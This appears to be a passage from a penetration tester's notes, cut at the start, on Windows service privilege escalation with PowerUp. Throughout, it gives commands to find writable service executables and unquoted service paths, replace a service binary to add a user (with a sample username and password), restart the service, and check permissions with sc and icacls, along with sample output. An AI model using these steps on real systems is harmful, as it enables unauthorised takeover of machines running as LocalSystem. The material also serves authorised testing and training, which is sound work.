Invoke-AllChecks

# focused service check
Get-ModifiableServiceFile

# abuse function to replace service binary 
Install-ServiceBinary -Name 'mysql' -UserName kira -Password kira_pw

# find unquoted service path
Get-UnquotedService

# Write service binary 
Write-ServiceBinary -Name 'UnquotedService' -Path "C:\Program Files\Enterprise Apps\adduser.exe
# Restart service - note: may throw error and still work 
Restart-Service UnquotedService 
```

e.g. interesting output
```powershell
Get-ModifiableServiceFile

[+] PowerUp - Modifiable Service File  
  
ServiceName : mysql  
Path : C:\xampp\mysql\bin\mysqld.exe --defaults-file=C:\xampp\mysql\bin\my.ini mysql  
ModifiableFile : C:\xampp\mysql\bin\mysqld.exe  
ModifiableFilePermissions : {WriteOwner, Delete, WriteAttributes, Synchronize...}  
ModifiableFileIdentityReference : BUILTIN\Users  
StartName : LocalSystem  
AbuseFunction : Install-ServiceBinary -Name 'mysql'  
CanRestart : False
```

manual validation
```cmd
:: validate service
sc qc mysql

:: check executable
sc qc mysql

:: check parent dir
icacls "C:\xampp\mysql\bin"

:: check restart possible
sc query mysql
sc stop mysql
sc start mysql

:: check permissions
icacls "C:\xampp\mysql\bin\mysqld.exe"  
icacls "C:\xampp\mysql\bin\my.ini"  
icacls "C:\xampp\mysql\bin"
```
note: `sc stop` or `sc start` fails with access denied -> may need to wait for reboot or another trigger.

